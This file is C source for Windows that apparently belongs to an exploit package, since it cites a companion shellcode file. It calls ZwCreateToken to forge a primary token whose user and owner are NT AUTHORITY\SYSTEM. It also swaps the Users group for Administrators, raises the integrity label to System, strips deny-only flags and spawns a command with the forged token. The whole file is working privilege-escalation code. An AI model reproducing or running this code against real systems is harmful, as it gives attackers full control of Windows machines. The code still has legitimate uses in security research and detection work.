#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <Sddl.h>



#ifndef SE_GROUP_INTEGRITY
#define SE_GROUP_INTEGRITY 0x00000020L
#endif


#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
#endif


typedef struct _SID_INTEGRITY
{
  UCHAR Revision;
  UCHAR SubAuthorityCount;
  SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
  ULONG SubAuthority[1];

} SID_INTEGRITY, *PSID_INTEGRITY;

typedef struct _SID_BUILTIN
{
  UCHAR Revision;
  UCHAR SubAuthorityCount;
  SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
  ULONG SubAuthority[2];

} SID_BUILTIN, *PSID_BUILTIN;

SID_BUILTIN TkSidLocalAdminGroup  = {1, 2, {0,0,0,0,0,5},{32,DOMAIN_ALIAS_RID_ADMINS}};
SID_INTEGRITY IntegritySIDHigh    = {1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY,SECURITY_MANDATORY_HIGH_RID  };
SID_INTEGRITY IntegritySIDSystem  = {1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY,SECURITY_MANDATORY_SYSTEM_RID};

typedef struct _UNICODE_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
  ULONG  Length;
  HANDLE  RootDirectory;
  PUNICODE_STRING  ObjectName;
  ULONG  Attributes;
  PVOID  SecurityDescriptor;
  PVOID  SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef CONST OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

typedef NTSYSAPI
NTSTATUS
(NTAPI *_ZwCreateToken)(
    OUT PHANDLE TokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN TOKEN_TYPE Type,
    IN PLUID AuthenticationId,
    IN PLARGE_INTEGER ExpirationTime,
    IN PTOKEN_USER User,
    IN PTOKEN_GROUPS Groups,
    IN PTOKEN_PRIVILEGES Privileges,
    IN PTOKEN_OWNER Owner,
    IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
    IN PTOKEN_DEFAULT_DACL DefaultDacl,
    IN PTOKEN_SOURCE Source
    );

_ZwCreateToken ZwCreateToken;



HMODULE LoadZwFunctions(_ZwCreateToken *ZwCreateToken)
{
    HMODULE hNtDll = LoadLibrary(L"ntdll.dll");
    if(hNtDll == NULL) 
		return NULL;

    *ZwCreateToken = (_ZwCreateToken)GetProcAddress(hNtDll, "ZwCreateToken");
    if(*ZwCreateToken == NULL) {
        FreeLibrary(hNtDll);
        return NULL;
    }
    return hNtDll;
}

LPVOID GetInfoFromToken(HANDLE hToken, TOKEN_INFORMATION_CLASS type)
{
	DWORD dw;
	BOOL ret = FALSE;
	LPVOID lpData = NULL;

	ret = GetTokenInformation(hToken, type, 0, 0, &dw);
    if(ret == FALSE && GetLastError() != ERROR_INSUFFICIENT_BUFFER) 
		return NULL;

	lpData = (LPVOID)LocalAlloc(LPTR, dw);
    ret = GetTokenInformation(hToken, type, lpData, dw, &dw);
	if(ret == FALSE)
		return NULL;

	return lpData;
}

BOOL SetSessionId(DWORD sessionId, HANDLE hToken)
{
  BOOL ret;
  ret = SetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(DWORD));
  if(ret == FALSE)
	  wprintf(L"SetTokenInformation Error: %x", GetLastError());

  return ret;
}

DWORD GetSessionId(HANDLE hToken)
{
	PDWORD si = GetInfoFromToken(hToken, TokenSessionId);
	if(si)
		return *si;
	else
		return 0xFFFFFFFFUL;
}


PSID GetLocalSystemSID()
{
	SID_IDENTIFIER_AUTHORITY sidAuth = SECURITY_NT_AUTHORITY;
	PSID psid = NULL;
	BOOL bRet = AllocateAndInitializeSid( &sidAuth, 1,
			SECURITY_LOCAL_SYSTEM_RID,
			0, 0, 0, 0, 0, 0, 0, &psid );
	if(!bRet) 
		return NULL;
	return psid;
}


/* Same as Shellcode32.c FindSID() */
PISID FindSIDFromSIDGroup(PSID_AND_ATTRIBUTES firstSid, UINT32 count, ULONG rid)
{
  UINT32 i;
  ULONG lRid;
  PSID_AND_ATTRIBUTES pSidList = firstSid;
  for(i=0; i<count; i++, pSidList++)
  {
    PISID pSid = pSidList->Sid;
	lRid = pSid->SubAuthority[pSid->SubAuthorityCount-1];
	if(lRid == rid)
		return pSid;
  }

  return NULL;
}



BOOL CreateTokenFromCaller(PHANDLE hToken)
{
	BOOL ret = FALSE;
	NTSTATUS ntStatus;  
	LUID luid;
	DWORD len = 0,i;
	LARGE_INTEGER li;
	DWORD sessionId;
	PLARGE_INTEGER pli;
	PLUID pluidAuth;

  /* token sections */
	PTOKEN_STATISTICS lpStatsToken = NULL;
	HANDLE hTokenCaller = NULL;
	PSID lpSidOwner = NULL;
	PTOKEN_GROUPS lpGroupToken = NULL;          
  PTOKEN_PRIVILEGES lpPrivToken = NULL;
  PTOKEN_OWNER lpOwnerToken = NULL;    
  PTOKEN_PRIMARY_GROUP lpPrimGroupToken = NULL; 
  PTOKEN_DEFAULT_DACL  lpDaclToken = NULL;
	PSID_AND_ATTRIBUTES pSid;
	PISID pSidSingle;
	TOKEN_USER userToken;
	TOKEN_SOURCE sourceToken = {{'!', '!', '!', '!', '!', '!', '!', '!'}, {0, 0}};
	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
	LUID authid = SYSTEM_LUID;
	_ZwCreateToken ZwCreateToken;

	SECURITY_QUALITY_OF_SERVICE sqos = {sizeof(sqos), SecurityAnonymous, SECURITY_STATIC_TRACKING, FALSE};
	OBJECT_ATTRIBUTES oa = {sizeof(oa), 0, 0, 0, 0, &sqos};


	*hToken = NULL;
	if(!LoadZwFunctions(&ZwCreateToken))
      return FALSE;

	__try
	{
    /* Open the current process token */
		ret = OpenProcessToken(GetCurrentProcess(), 
			                     TOKEN_QUERY | TOKEN_QUERY_SOURCE,
                           &hTokenCaller);
	  if(!ret) 
		  __leave;

    /* Allocate and Initialize a new NT AUTHORITY\SYSTEM SID */
    ret = AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID,
                                       0, 0, 0, 0, 0, 0, 0, &lpSidOwner);
	  if(!ret)
	    __leave;
	
		userToken.User.Sid        = lpSidOwner;
		userToken.User.Attributes = 0;
    
    ret = AllocateLocallyUniqueId(&luid);
	  if(!ret)
		  __leave;

		sourceToken.SourceIdentifier.LowPart  = luid.LowPart;
		sourceToken.SourceIdentifier.HighPart = luid.HighPart; 
        
	  /* Retrieve most of the token sections as-is */
    lpStatsToken = (PTOKEN_STATISTICS)(GetInfoFromToken(hTokenCaller, TokenStatistics));
		lpGroupToken = (PTOKEN_GROUPS)    (GetInfoFromToken(hTokenCaller, TokenGroups));
    lpPrivToken  = (PTOKEN_PRIVILEGES)(GetInfoFromToken(hTokenCaller, TokenPrivileges));

    /* Modify token group section: add the BUILTIN\Administrators group */
		pSid=lpGroupToken->Groups;

		pSidSingle = FindSIDFromSIDGroup(pSid, lpGroupToken->GroupCount, DOMAIN_ALIAS_RID_USERS);
		if(pSidSingle)
			memcpy(pSidSingle, &TkSidLocalAdminGroup, sizeof(TkSidLocalAdminGroup));

    /* Overwrite the Integrity SID and remove deny-only SID flags */
		for(i=0; i<lpGroupToken->GroupCount; i++,pSid++)
		{
			if(pSid->Attributes & SE_GROUP_INTEGRITY)
				memcpy(pSid->Sid, &IntegritySIDSystem, sizeof(IntegritySIDSystem));

			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
		}

    lpOwnerToken = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
		lpOwnerToken->Owner = GetLocalSystemSID();

		lpPrimGroupToken = (PTOKEN_PRIMARY_GROUP)(GetInfoFromToken(hTokenCaller, TokenPrimaryGroup)); 
    lpDaclToken = (PTOKEN_DEFAULT_DACL)(GetInfoFromToken(hTokenCaller, TokenDefaultDacl));

		pluidAuth = &authid;
		li.LowPart = 0xFFFFFFFF;
		li.HighPart = 0xFFFFFFFF;
		pli = &li;

    /* Get current session ID */
		sessionId = GetSessionId(hTokenCaller);

    /* Invoke the ZwCreateToken API to create a new fresh high privileged token */
    ntStatus = ZwCreateToken(hToken, 
							               TOKEN_ALL_ACCESS, 
								             &oa, 
								             TokenPrimary, 
								             pluidAuth,
								             pli,
								             &userToken,
							               lpGroupToken, 
								             lpPrivToken, 
								             lpOwnerToken, 
								             lpPrimGroupToken, 
								             lpDaclToken,
								             &sourceToken);

		if(ntStatus == STATUS_SUCCESS)
		{
      /* Set the current Session ID (don't leave the spawned process in the Session 0) */
			ret = SetSessionId(sessionId, *hToken);
			sessionId = GetSessionId(*hToken);
			ret = TRUE;
		}
		else
			ret = FALSE;
	}
	__finally
	{
    /* Free stuffs */

		if(hTokenCaller) CloseHandle(hTokenCaller);
		if(lpSidOwner)   FreeSid(lpSidOwner);
    if(lpStatsToken) LocalFree(lpStatsToken);
		if(lpGroupToken) LocalFree(lpGroupToken);
		if(lpPrivToken)  LocalFree(lpPrivToken);
		if(lpOwnerToken)
		{
			if(lpOwnerToken->Owner) 
        FreeSid(lpOwnerToken->Owner);
			LocalFree(lpOwnerToken);
		}
		if(lpPrimGroupToken) LocalFree(lpPrimGroupToken);
		if(lpDaclToken)      LocalFree(lpDaclToken);
	}

	return ret;
}



BOOL SpawnChildWithToken(HANDLE hToken, PWCHAR command)
{
  SECURITY_DESCRIPTOR sD;
  SECURITY_ATTRIBUTES sa = {0};
  BOOL pSucc;
  PROCESS_INFORMATION pi;
  WCHAR szLocalCmdLine[MAX_PATH];
  STARTUPINFO si;

  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));


	memset(&pi, 0x00, sizeof(pi));
	if (!InitializeSecurityDescriptor(&sD, SECURITY_DESCRIPTOR_REVISION))
    return FALSE;
	
  if(!SetSecurityDescriptorDacl(&sD, TRUE, NULL, FALSE))
    return FALSE;

	sa.nLength = sizeof(sa);
  sa.lpSecurityDescriptor = &sD;
  memset(szLocalCmdLine, 0x00, sizeof(szLocalCmdLine));
	wcscpy_s(szLocalCmdLine, MAX_PATH - 1, command);
	
	pSucc = CreateProcessAsUser(hToken, 
                              NULL, 
                              (LPWSTR)szLocalCmdLine, 
                              &sa, &sa, 
                              FALSE, 
                              CREATE_NEW_CONSOLE,
                              NULL,
                              NULL, 
                              &si, &pi);

	if(!pSucc)
	{
		wprintf(L"[!] CreateProcessAsUser failed: error(%d)\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


